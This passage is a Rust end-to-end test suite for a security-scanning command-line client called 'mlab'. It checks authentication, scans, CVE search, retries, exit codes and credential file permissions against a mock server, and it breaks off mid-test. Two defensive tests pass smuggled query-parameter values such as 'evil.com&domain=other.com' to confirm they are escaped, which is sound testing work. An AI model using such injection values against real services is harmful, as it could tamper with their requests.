//! End-to-end tests: the real binary against a real socket. Each test pins a
//! behaviour that regressed against production at least once — the URL we call,
//! the shape we parse, and the exit code we hand back.

mod common;

use common::*;

const WHOAMI_OK: &str =
    r#"{"message":"Hello, ACME!","organization":"ACME","plan":"pro","auth":"api_key"}"#;

// ── Authentication ────────────────────────────────────────────────────────

#[test]
fn whoami_reports_the_organization_for_a_valid_key() {
    let server = TestServer::start(|req| match req.route_path() {
        "/api/v1/" => json(WHOAMI_OK),
        _ => not_found(),
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["whoami"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert!(stdout(&out).contains("ACME"));
    assert!(stdout(&out).contains("pro"));
}

#[test]
fn whoami_rejects_a_key_the_api_answers_200_for() {
    // The API greets unknown keys with a 200 and a generic message, so the
    // status code alone cannot be trusted to mean "authenticated".
    let server = TestServer::start(|req| match req.route_path() {
        "/api/v1/" => json(r#"{"message":"Hello! Please authenticate with an API key or session."}"#),
        _ => not_found(),
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["whoami"]);

    assert_eq!(out.status.code(), Some(EXIT_AUTH), "stdout: {}", stdout(&out));
    assert!(stderr(&out).to_lowercase().contains("not recognized"));
}

#[test]
fn every_request_carries_the_api_key_as_a_token_header() {
    let server = TestServer::start(|_| json(WHOAMI_OK));
    let home = TempHome::with_key(&server.url, "mlab_secret");

    mlab(&home, &["whoami"]);

    let request = &server.requests()[0];
    assert_eq!(
        request.headers.get("authorization").map(String::as_str),
        Some("token mlab_secret")
    );
}

#[test]
fn commands_refuse_to_run_without_a_configured_key() {
    let server = TestServer::start(|_| json(WHOAMI_OK));
    let home = TempHome::with_key(&server.url, "");

    let out = mlab(&home, &["whoami"]);

    assert_eq!(out.status.code(), Some(EXIT_AUTH));
    assert!(stderr(&out).contains("mlab login"));
    assert!(server.requests().is_empty(), "no call should be attempted");
}

// ── File upload ───────────────────────────────────────────────────────────

#[test]
fn file_upload_targets_the_site_root_not_the_api_prefix() {
    // `/upload/file` lives at the root; the API router has no `upload` route,
    // so prefixing it with /api/v1 makes every upload 404.
    let server = TestServer::start(|req| match req.route_path() {
        "/upload/file" => json(r#"{"success":true,"sha256":"deadbeef","job_launched":true}"#),
        _ => not_found(),
    });
    let home = TempHome::new(&server.url);
    let sample = home.path.join("sample.txt");
    std::fs::write(&sample, b"hello").unwrap();

    let out = mlab(&home, &["scan", "file", sample.to_str().unwrap()]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(server.routes(), vec!["POST /upload/file"]);
    assert!(stdout(&out).contains("deadbeef"));
}

#[test]
fn an_unreadable_file_is_an_error_not_a_panic() {
    let server = TestServer::start(|_| not_found());
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "file", "/nonexistent/nothing.bin"]);

    assert_eq!(out.status.code(), Some(EXIT_INPUT));
    assert!(!stderr(&out).contains("panicked"), "stderr: {}", stderr(&out));
    assert!(server.requests().is_empty());
}

// ── Quotas ────────────────────────────────────────────────────────────────

#[test]
fn limits_render_remaining_against_the_total() {
    let server = TestServer::start(|req| {
        if req.route_path().starts_with("/api/v1/limit/") {
            let scan_type = req.route_path().rsplit('/').next().unwrap();
            json(&format!(
                r#"{{"scan_type":"{scan_type}","remaining":98,"total":100}}"#
            ))
        } else {
            not_found()
        }
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["limits", "domain"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert!(stdout(&out).contains("98 / 100"), "stdout: {}", stdout(&out));
}

#[test]
fn limits_query_every_scan_type_when_none_is_named() {
    let server = TestServer::start(|_| json(r#"{"scan_type":"x","remaining":1,"total":10}"#));
    let home = TempHome::new(&server.url);

    mlab(&home, &["limits"]);

    let routes = server.routes();
    for scan_type in ["domain", "ip", "file", "crypto"] {
        assert!(
            routes.contains(&format!("GET /api/v1/limit/{scan_type}")),
            "missing {scan_type} in {routes:?}"
        );
    }
}

#[test]
fn limits_raw_prints_only_the_remaining_count() {
    let server = TestServer::start(|_| json(r#"{"scan_type":"crypto","remaining":42,"total":50}"#));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["limits", "crypto", "--raw"]);

    assert!(out.status.success());
    assert_eq!(stdout(&out).trim(), "42");
}

#[test]
fn limits_surface_the_api_error_and_fail() {
    let server = TestServer::start(|_| error(401, "Unauthorized"));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["limits", "domain"]);

    assert_eq!(out.status.code(), Some(EXIT_AUTH));
    assert!(stderr(&out).contains("Unauthorized"), "stderr: {}", stderr(&out));
}

#[test]
fn an_unknown_limit_type_is_rejected_before_any_call() {
    let server = TestServer::start(|_| not_found());
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["limits", "banana"]);

    assert_eq!(out.status.code(), Some(EXIT_ERROR));
    assert!(server.requests().is_empty());
}

// ── Crypto ────────────────────────────────────────────────────────────────

const BTC_ADDRESS: &str = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
const CRYPTO_BTC: &str =
    r#"{"address":"x","chain":"BTC","chain_source":"detected","risk_score":0}"#;

#[test]
fn crypto_lets_the_api_detect_the_chain_when_none_is_given() {
    // Sending a chain overrides server-side classification, so a hardcoded
    // default would look up a BTC address on the wrong chain.
    let server = TestServer::start(|_| json(CRYPTO_BTC));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "crypto", BTC_ADDRESS]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let request = server.first_matching("/scan/crypto").expect("crypto call");
    assert!(!request.path.contains("chain="), "path: {}", request.path);
    assert!(request.path.contains(BTC_ADDRESS));
}

#[test]
fn crypto_forwards_an_explicit_chain() {
    let server = TestServer::start(|_| json(CRYPTO_BTC));
    let home = TempHome::new(&server.url);

    mlab(&home, &["scan", "crypto", BTC_ADDRESS, "--chain", "btc"]);

    let request = server.first_matching("/scan/crypto").expect("crypto call");
    assert!(request.path.contains("chain=btc"), "path: {}", request.path);
}

#[test]
fn crypto_reports_the_chain_the_api_resolved() {
    let server = TestServer::start(|_| json(CRYPTO_BTC));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "crypto", BTC_ADDRESS]);

    let rendered = stdout(&out);
    assert!(rendered.contains("BTC"), "stdout: {rendered}");
    assert!(rendered.contains("detected"), "stdout: {rendered}");
}

// ── Domain scan ───────────────────────────────────────────────────────────

const DOMAIN_RESULTS: &str = r#"{
  "status":"completed","domain":"example.com","scan_date":"2026-07-05 16:13:00 UTC",
  "results":{
    "subdomains":["www.example.com","api.example.com"],
    "subdomains_suspicious":[{"keyword":"admin","subdomain":"admin.example.com"}],
    "dns":{"resolve":[{"domain":"www.example.com","a":["93.184.216.34"],"aaaa":null,"cname":null}],
           "txt":{"raw":["v=spf1 -all"],"spf":"v=spf1 -all","dmarc":null,"dkim":[]}},
    "ssl":[],
    "files":{"security_txt":"","robots_txt":"User-agent: *"}
  }}"#;

fn domain_server(status_body: &'static str) -> TestServer {
    TestServer::start(move |req| match (req.method.as_str(), req.route_path()) {
        ("POST", "/api/v1/scan/domain") => json(r#"{"status":"success"}"#),
        ("GET", "/api/v1/scan/domain/status") => json(status_body),
        ("GET", "/api/v1/scan/domain/results") => json(DOMAIN_RESULTS),
        _ => not_found(),
    })
}

#[test]
fn domain_scan_follows_to_completion_and_renders_the_report() {
    let server = domain_server(r#"{"status":"success"}"#);
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "domain", "example.com"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let rendered = stdout(&out);
    assert!(rendered.contains("Domain Scan Results"), "stdout: {rendered}");
    assert!(rendered.contains("www.example.com"));
    assert!(rendered.contains("admin.example.com"));
}

#[test]
fn domain_scan_stops_when_the_scan_fails() {
    let server = domain_server(r#"{"status":"failed","message":"boom"}"#);
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "domain", "example.com"]);

    assert_eq!(out.status.code(), Some(EXIT_ERROR), "stdout: {}", stdout(&out));
    assert!(stderr(&out).contains("failed"), "stderr: {}", stderr(&out));
    // It must give up rather than poll a dead scan until the timeout.
    let polls = server
        .routes()
        .iter()
        .filter(|r| r.contains("/scan/domain/status"))
        .count();
    assert_eq!(polls, 1, "routes: {:?}", server.routes());
}

#[test]
fn domain_scan_stops_on_a_client_error_while_polling() {
    let server = TestServer::start(|req| match (req.method.as_str(), req.route_path()) {
        ("POST", "/api/v1/scan/domain") => json(r#"{"status":"success"}"#),
        ("GET", "/api/v1/scan/domain/status") => error(401, "Unauthorized"),
        _ => not_found(),
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "domain", "example.com"]);

    assert_eq!(out.status.code(), Some(EXIT_AUTH));
    assert!(stderr(&out).contains("Unauthorized"), "stderr: {}", stderr(&out));
    assert!(stderr(&out).contains("mlab results domain example.com"));
}

#[test]
fn domain_scan_reports_a_rejected_launch_without_polling() {
    let server = TestServer::start(|req| match (req.method.as_str(), req.route_path()) {
        ("POST", "/api/v1/scan/domain") => error(400, "Scan limit reached. Please try again later."),
        _ => not_found(),
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "domain", "example.com"]);

    assert_eq!(out.status.code(), Some(EXIT_QUOTA));
    assert!(stderr(&out).contains("Scan limit reached"), "stderr: {}", stderr(&out));
    assert_eq!(server.routes(), vec!["POST /api/v1/scan/domain"]);
}

#[test]
fn no_follow_launches_the_scan_and_returns_immediately() {
    let server = domain_server(r#"{"status":"pending"}"#);
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "domain", "example.com", "--no-follow"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(server.routes(), vec!["POST /api/v1/scan/domain"]);
}

// ── Results ───────────────────────────────────────────────────────────────

#[test]
fn results_warn_when_a_completed_scan_carries_no_data() {
    // The status route answers "success" even for failed scans, so an empty
    // report is the only hint the user gets that nothing was produced.
    let server = TestServer::start(|_| {
        json(r#"{"status":"completed","domain":"example.com","scan_date":"","results":{}}"#)
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "domain", "example.com"]);

    assert!(stderr(&out).contains("Empty report"), "stderr: {}", stderr(&out));
}

#[test]
fn results_json_passes_the_payload_through_untouched() {
    let server = TestServer::start(|_| json(DOMAIN_RESULTS));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "domain", "example.com", "--json"]);

    assert!(out.status.success());
    let parsed: serde_json::Value = serde_json::from_str(&stdout(&out)).expect("valid json");
    assert_eq!(parsed["results"]["subdomains"][0], "www.example.com");
}

#[test]
fn results_json_is_accepted_before_the_sub_command_too() {
    let server = TestServer::start(|_| json(DOMAIN_RESULTS));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "--json", "domain", "example.com"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    serde_json::from_str::<serde_json::Value>(&stdout(&out)).expect("valid json");
}

#[test]
fn file_results_are_fetched_by_hash() {
    let server = TestServer::start(|_| {
        json(
            r#"{"status":"completed","jobs_total":1,"jobs_completed":1,
                "file":{"sha256":"abc","md5":"d4","ssdeep":"3:tk:tk","filename":"x.png","size":70,
                        "mime_type":"image/png","created_at":"2026-07-05T16:13:54Z"},
                "analysis":[{"job_name":"exiftool","end_date":"2026-07-05T16:14:04+00:00","data":"File Type : PNG"}]}"#,
        )
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "file", "abc"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let request = &server.requests()[0];
    assert_eq!(request.route_path(), "/api/v1/scan/file/results");
    assert!(request.path.contains("sha256=abc"));
}

// ── SSL ───────────────────────────────────────────────────────────────────

#[test]
fn ssl_reads_the_certificate_array() {
    let server = TestServer::start(|_| {
        json(
            r#"[{"common_name":"www.example.com","issuer_name":"C=US, O=DigiCert Inc",
                 "not_before":"2026-01-15T00:00:00","not_after":"2027-01-15T23:59:59",
                 "name_value":"www.example.com","serial_number":"01"}]"#,
        )
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["ssl", "example.com"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert!(stdout(&out).contains("www.example.com"));
    assert_eq!(server.requests()[0].route_path(), "/api/v1/domain/ssl");
}

#[test]
fn ssl_handles_a_domain_with_no_cached_certificates() {
    let server = TestServer::start(|_| json("[]"));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["ssl", "example.com"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert!(stdout(&out).to_lowercase().contains("no ssl certificates"));
}

// ── IP ────────────────────────────────────────────────────────────────────

#[test]
fn ip_lookup_renders_network_and_location() {
    let server = TestServer::start(|_| {
        json(
            r#"{"ip":"8.8.8.8","reserved":false,"isp":"Google LLC","org":"Google Public DNS",
                "as":"AS15169","city":"Mountain View","region":"California","country":"United States",
                "country_code":"US","continent":"North America","timezone":"America/Los_Angeles"}"#,
        )
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "ip", "8.8.8.8"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let rendered = stdout(&out);
    assert!(rendered.contains("Google LLC"));
    assert!(rendered.contains("Mountain View"));
    assert!(server.requests()[0].path.contains("ip=8.8.8.8"));
}

#[test]
fn a_reserved_ip_is_labelled_rather_than_geolocated() {
    let server = TestServer::start(|_| {
        json(r#"{"ip":"10.0.0.1","reserved":true,"type":"Private","range":"10.0.0.0/8","rfc":"RFC1918"}"#)
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "ip", "10.0.0.1"]);

    assert!(out.status.success());
    assert!(stdout(&out).contains("RFC1918"), "stdout: {}", stdout(&out));
}

// ── CVE (vuln.mlab.sh, unauthenticated) ───────────────────────────────────

#[test]
fn cve_search_hits_the_cve_host_with_the_documented_parameters() {
    let server = TestServer::start(|_| {
        json(r#"{"cves":[],"total_results":0,"start_index":0,"results_per_page":0}"#)
    });
    let home = TempHome::new("https://unused.example");

    let out = mlab(
        &home,
        &[
            "--cve-hostname",
            &server.url,
            "cve",
            "search",
            "openssl",
            "--severity",
            "HIGH",
            "--date-start",
            "2026-01-01",
            "--exact",
        ],
    );

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let path = &server.requests()[0].path;
    assert!(path.starts_with("/api/v1/cve?"), "path: {path}");
    assert!(path.contains("q=openssl"), "path: {path}");
    assert!(path.contains("severity=HIGH"), "path: {path}");
    assert!(path.contains("dateStart=2026-01-01"), "path: {path}");
    assert!(path.contains("exact=1"), "path: {path}");
}

#[test]
fn cve_detail_requests_the_identifier_path() {
    let server = TestServer::start(|_| json(r#"{"id":"CVE-2024-3094"}"#));
    let home = TempHome::new("https://unused.example");

    let out = mlab(
        &home,
        &["--cve-hostname", &server.url, "cve", "detail", "CVE-2024-3094", "--json"],
    );

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(server.requests()[0].route_path(), "/api/v1/cve/CVE-2024-3094");
}

#[test]
fn cve_commands_need_no_api_key() {
    let server = TestServer::start(|_| {
        json(r#"{"cves":[],"total_results":0,"start_index":0,"results_per_page":0}"#)
    });
    let home = TempHome::with_key("https://unused.example", "");

    let out = mlab(&home, &["--cve-hostname", &server.url, "cve", "latest"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(server.requests()[0].route_path(), "/api/v1/cve/latest");
}

// ── Error classification ──────────────────────────────────────────────────
// Production answers 400 for quota, maintenance and bad input alike, with the
// reason in the body. These pin the mapping from that reason to an exit code a
// script can branch on.

#[test]
fn maintenance_is_reported_as_maintenance() {
    let server = TestServer::start(|_| {
        error(400, "Service temporarily unavailable for maintenance. Please try again later.")
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "ip", "8.8.8.8"]);

    assert_eq!(out.status.code(), Some(EXIT_MAINTENANCE));
    assert!(stderr(&out).contains("maintenance"));
}

#[test]
fn malformed_input_and_a_missing_record_get_different_codes() {
    let invalid = TestServer::start(|_| error(400, "Provided domain is invalid."));
    let home = TempHome::new(&invalid.url);
    let out = mlab(&home, &["results", "domain", "nope"]);
    assert_eq!(out.status.code(), Some(EXIT_INPUT), "stderr: {}", stderr(&out));

    let missing = TestServer::start(|_| error(400, "No scan found for the provided domain."));
    let home = TempHome::new(&missing.url);
    let out = mlab(&home, &["results", "domain", "example.com"]);
    assert_eq!(out.status.code(), Some(EXIT_NOT_FOUND), "stderr: {}", stderr(&out));
}

#[test]
fn an_error_message_is_shown_instead_of_the_raw_json() {
    let server = TestServer::start(|_| error(400, "Provided domain is invalid."));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "domain", "nope"]);

    assert!(stderr(&out).contains("Provided domain is invalid."));
    assert!(!stderr(&out).contains(r#""error""#), "raw JSON leaked: {}", stderr(&out));
}

#[test]
fn an_auth_failure_points_at_the_command_that_fixes_it() {
    let server = TestServer::start(|_| error(401, "Unauthorized"));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "ip", "8.8.8.8"]);

    assert_eq!(out.status.code(), Some(EXIT_AUTH));
    assert!(stderr(&out).contains("mlab login"), "stderr: {}", stderr(&out));
}

// ── Transport resilience ──────────────────────────────────────────────────

#[test]
fn a_get_is_retried_when_the_server_faults() {
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    let calls = Arc::new(AtomicUsize::new(0));
    let seen = Arc::clone(&calls);
    let server = TestServer::start(move |_| {
        // Fail twice, then answer: a blip must not become the user's problem.
        if seen.fetch_add(1, Ordering::SeqCst) < 2 {
            status_json(500, r#"{"error":"upstream"}"#)
        } else {
            json(r#"{"ip":"8.8.8.8","reserved":false,"isp":"Google LLC"}"#)
        }
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "ip", "8.8.8.8"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(calls.load(Ordering::SeqCst), 3);
}

#[test]
fn a_scan_launch_is_never_replayed() {
    // Retrying a POST would spend the caller's quota a second time.
    let server = TestServer::start(|_| status_json(500, r#"{"error":"upstream"}"#));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "domain", "example.com"]);

    assert!(!out.status.success());
    assert_eq!(server.routes(), vec!["POST /api/v1/scan/domain"]);
}

#[test]
fn a_rate_limit_with_a_short_retry_after_is_obeyed() {
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;

    let calls = Arc::new(AtomicUsize::new(0));
    let seen = Arc::clone(&calls);
    let server = TestServer::start(move |_| {
        if seen.fetch_add(1, Ordering::SeqCst) == 0 {
            error(429, "slow down").header("Retry-After", "1")
        } else {
            json(r#"{"ip":"8.8.8.8","reserved":false,"isp":"Google LLC"}"#)
        }
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "ip", "8.8.8.8"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(calls.load(Ordering::SeqCst), 2);
}

#[test]
fn a_long_rate_limit_is_reported_as_a_quota_problem() {
    let server = TestServer::start(|_| error(429, "slow down").header("Retry-After", "600"));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "ip", "8.8.8.8"]);

    assert_eq!(out.status.code(), Some(EXIT_QUOTA));
    assert!(stderr(&out).contains("600"), "stderr: {}", stderr(&out));
}

// ── Query escaping ────────────────────────────────────────────────────────

#[test]
fn values_are_escaped_before_they_reach_the_query_string() {
    let server = TestServer::start(|_| json(DOMAIN_RESULTS));
    let home = TempHome::new(&server.url);

    mlab(&home, &["results", "domain", "evil.com&domain=other.com"]);

    let path = &server.requests()[0].path;
    assert!(path.contains("%26"), "path: {path}");
    // Exactly one parameter: the smuggled one must not survive.
    assert_eq!(path.matches("domain=").count(), 1, "path: {path}");
}

#[test]
fn the_hash_in_a_file_lookup_is_escaped_too() {
    let server = TestServer::start(|_| not_found());
    let home = TempHome::new(&server.url);

    mlab(&home, &["results", "file", "abc&x=1"]);

    assert!(server.requests()[0].path.contains("%26"));
}

// ── Status rendering ──────────────────────────────────────────────────────

#[test]
fn status_renders_a_badge_instead_of_dumping_json() {
    let server = TestServer::start(|_| json(r#"{"status":"scanning","message":"in progress"}"#));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["status", "domain", "example.com"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let rendered = stdout(&out);
    assert!(rendered.contains("scanning"), "stdout: {rendered}");
    assert!(!rendered.contains(r#""status""#), "raw JSON leaked: {rendered}");
}

#[test]
fn status_still_offers_raw_json() {
    let server = TestServer::start(|_| json(r#"{"status":"success","message":"done"}"#));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["status", "domain", "example.com", "--json"]);

    assert!(out.status.success());
    let parsed: serde_json::Value = serde_json::from_str(&stdout(&out)).expect("valid json");
    assert_eq!(parsed["status"], "success");
}

// ── SSL ───────────────────────────────────────────────────────────────────

#[test]
fn an_empty_certificate_list_explains_that_a_scan_comes_first() {
    let server = TestServer::start(|_| json("[]"));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["ssl", "example.com"]);

    assert!(out.status.success());
    assert!(
        stdout(&out).contains("mlab scan domain example.com"),
        "stdout: {}",
        stdout(&out)
    );
}

#[test]
fn an_expired_certificate_is_labelled_expired() {
    // Dated in the past on purpose: expiry must be computed against the clock,
    // never against a date baked into the binary.
    let server = TestServer::start(|_| {
        json(
            r#"[{"common_name":"old.example.com","issuer_name":"CN=Old CA",
                 "not_before":"2020-01-01T00:00:00","not_after":"2021-01-01T00:00:00",
                 "name_value":"old.example.com","serial_number":"01"}]"#,
        )
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["ssl", "example.com"]);

    assert!(stdout(&out).contains("expired"), "stdout: {}", stdout(&out));
}

#[test]
fn ssl_offers_raw_json_too() {
    let server = TestServer::start(|_| json("[]"));
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["ssl", "example.com", "--json"]);

    assert!(out.status.success());
    assert_eq!(stdout(&out).trim(), "[]");
}

#[test]
fn the_domain_report_shows_the_certificates_it_already_received() {
    let server = TestServer::start(|_| {
        json(
            r#"{"status":"completed","domain":"example.com","scan_date":"2026-07-05 16:13:00 UTC",
                "results":{"subdomains":["www.example.com"],"subdomains_suspicious":[],
                "dns":{"resolve":[],"txt":{"raw":[],"spf":null,"dmarc":null,"dkim":[]}},
                "ssl":[{"common_name":"www.example.com","issuer_name":"C=US, O=DigiCert Inc, CN=DigiCert Global CA G2",
                        "not_before":"2026-01-15T00:00:00","not_after":"2099-01-15T23:59:59",
                        "name_value":"www.example.com","serial_number":"01"}],
                "files":{"security_txt":"","robots_txt":""}}}"#,
        )
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["results", "domain", "example.com"]);

    let rendered = stdout(&out);
    assert!(rendered.contains("SSL Certificates"), "stdout: {rendered}");
    assert!(rendered.contains("DigiCert Global CA G2"), "stdout: {rendered}");
    // And it no longer sends the user elsewhere for data already on screen.
    assert!(!rendered.contains("are not shown here"), "stdout: {rendered}");
}

// ── Upload rendering ──────────────────────────────────────────────────────

#[test]
fn an_upload_tells_the_user_how_to_read_the_results() {
    let server = TestServer::start(|_| {
        json(r#"{"success":true,"filename":"x.png","sha256":"deadbeef","job_launched":true}"#)
    });
    let home = TempHome::new(&server.url);
    let sample = home.path.join("sample.txt");
    std::fs::write(&sample, b"hello").unwrap();

    let out = mlab(&home, &["scan", "file", sample.to_str().unwrap()]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert!(stdout(&out).contains("mlab results file deadbeef"), "stdout: {}", stdout(&out));
}

// ── Credentials ───────────────────────────────────────────────────────────

#[test]
fn an_environment_variable_can_stand_in_for_the_stored_key() {
    let server = TestServer::start(|_| json(WHOAMI_OK));
    let home = TempHome::with_key(&server.url, "");

    let out = mlab_env(&home, &["whoami"], &[("MLAB_API_KEY", "mlab_from_env")]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(
        server.requests()[0].headers.get("authorization").map(String::as_str),
        Some("token mlab_from_env")
    );
}

#[test]
fn an_explicit_flag_outranks_both_the_file_and_the_environment() {
    let server = TestServer::start(|_| json(WHOAMI_OK));
    let home = TempHome::with_key(&server.url, "mlab_from_file");

    let out = mlab_env(
        &home,
        &["--api-key", "mlab_from_flag", "whoami"],
        &[("MLAB_API_KEY", "mlab_from_env")],
    );

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert_eq!(
        server.requests()[0].headers.get("authorization").map(String::as_str),
        Some("token mlab_from_flag")
    );
}

#[test]
fn login_verifies_the_key_before_writing_it_down() {
    let server = TestServer::start(|_| json(WHOAMI_OK));
    let home = TempHome::with_key(&server.url, "");

    let out = mlab(&home, &["--hostname", &server.url, "login", "--key", "mlab_good"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    assert!(read_config(&home).contains("mlab_good"));
    assert!(stdout(&out).contains("ACME"));
}

#[test]
fn login_refuses_a_key_the_api_does_not_accept_and_saves_nothing() {
    let server = TestServer::start(|_| json(r#"{"message":"Hello! Please authenticate."}"#));
    let home = TempHome::with_key(&server.url, "");

    let out = mlab(&home, &["--hostname", &server.url, "login", "--key", "mlab_bad"]);

    assert_eq!(out.status.code(), Some(EXIT_AUTH));
    assert!(!read_config(&home).contains("mlab_bad"), "config: {}", read_config(&home));
}

#[test]
fn logout_clears_the_key_but_keeps_the_hostname() {
    let server = TestServer::start(|_| json(WHOAMI_OK));
    let home = TempHome::with_key(&server.url, "mlab_stored");

    let out = mlab(&home, &["logout"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let config = read_config(&home);
    assert!(!config.contains("mlab_stored"), "config: {config}");
    assert!(config.contains(&server.url), "config: {config}");
}

#[cfg(unix)]
#[test]
fn the_saved_credential_is_not_world_readable() {
    use std::os::unix::fs::PermissionsExt;

    let server = TestServer::start(|_| json(WHOAMI_OK));
    let home = TempHome::with_key(&server.url, "");

    mlab(&home, &["--hostname", &server.url, "login", "--key", "mlab_good"]);

    let mode = std::fs::metadata(home.path.join(".mlab").join("conf.yml"))
        .expect("config exists")
        .permissions()
        .mode();
    assert_eq!(mode & 0o777, 0o600, "mode was {:o}", mode & 0o777);
}

// ── CVE ───────────────────────────────────────────────────────────────────

const EMPTY_SEARCH: &str = r#"{"cves":[],"total_results":0,"start_index":0,"results_per_page":0}"#;

#[test]
fn cve_search_forwards_every_filter_the_api_supports() {
    let server = TestServer::start(|_| json(EMPTY_SEARCH));
    let home = TempHome::new("https://unused.example");

    let out = mlab(
        &home,
        &[
            "--cve-hostname", &server.url, "cve", "search", "openssl",
            "--severity", "HIGH",
            "--date-start", "2026-01-01",
            "--date-end", "2026-06-30",
            "--vendor", "redhat",
            "--cwe", "CWE-79",
            "--min-cvss", "7.5",
            "--kev-only",
            "--exact",
            "--page", "2",
            "--limit", "50",
        ],
    );

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let path = &server.requests()[0].path;
    for expected in [
        "q=openssl", "severity=HIGH", "dateStart=2026-01-01", "dateEnd=2026-06-30",
        "vendor=redhat", "cwe=CWE-79", "minCvss=7.5", "kevOnly=1", "exact=1",
        "page=2", "limit=50",
    ] {
        assert!(path.contains(expected), "missing {expected} in {path}");
    }
}

#[test]
fn cve_search_sends_only_the_filters_that_were_asked_for() {
    let server = TestServer::start(|_| json(EMPTY_SEARCH));
    let home = TempHome::new("https://unused.example");

    mlab(&home, &["--cve-hostname", &server.url, "cve", "search", "openssl"]);

    let path = &server.requests()[0].path;
    assert_eq!(path, "/api/v1/cve?q=openssl", "path: {path}");
}

#[test]
fn cve_errors_hidden_inside_a_200_body_are_still_errors() {
    // The CVE host reports failures with a 200 and an `error` key, so a status
    // check alone would let this through as success.
    let server = TestServer::start(|_| json(r#"{"error":"package vulnerability lookup is busy"}"#));
    let home = TempHome::new("https://unused.example");

    let out = mlab(&home, &["--cve-hostname", &server.url, "cve", "search", "npm/lodash"]);

    assert!(!out.status.success(), "stdout: {}", stdout(&out));
    assert!(stderr(&out).contains("busy"), "stderr: {}", stderr(&out));
}

#[test]
fn cve_search_says_when_there_are_more_pages() {
    let server = TestServer::start(|_| {
        json(
            r#"{"total_results":100,"results_per_page":1,"start_index":0,
                "cves":[{"id":"CVE-2026-0001","description":"x","published":"2026-01-01",
                         "cvss_score":9.8,"cvss_severity":"CRITICAL","in_kev":false}]}"#,
        )
    });
    let home = TempHome::new("https://unused.example");

    let out = mlab(&home, &["--cve-hostname", &server.url, "cve", "search", "x"]);

    assert!(stdout(&out).contains("--page 1"), "stdout: {}", stdout(&out));
}

#[test]
fn a_rate_limited_cve_call_reports_the_quota_reason() {
    let server = TestServer::start(|_| error(429, "slow down").header("Retry-After", "600"));
    let home = TempHome::new("https://unused.example");

    let out = mlab(&home, &["--cve-hostname", &server.url, "cve", "latest"]);

    assert_eq!(out.status.code(), Some(EXIT_QUOTA));
    assert!(stderr(&out).contains("rate limited"), "stderr: {}", stderr(&out));
}

// ── Single-value lookups ──────────────────────────────────────────────────

#[test]
fn url_analysis_does_not_follow_the_link_unless_asked() {
    let server = TestServer::start(|_| {
        json(r#"{"url":"https://a.test/x","scheme":"https","host":"a.test",
                 "findings":[{"severity":"high","title":"Punycode host","detail":"looks like a lookalike"}]}"#)
    });
    let home = TempHome::new(&server.url);

    let out = mlab(&home, &["scan", "url", "https://a.test/x"]);

    assert!(out.status.success(), "stderr: {}", stderr(&out));
    let path = &server.requests()[0].path;
    assert!(path.starts_with("/api/v1/scan/url?url="), "path: {path}");
    // Fetching an attacker-chosen URL is opt-in.
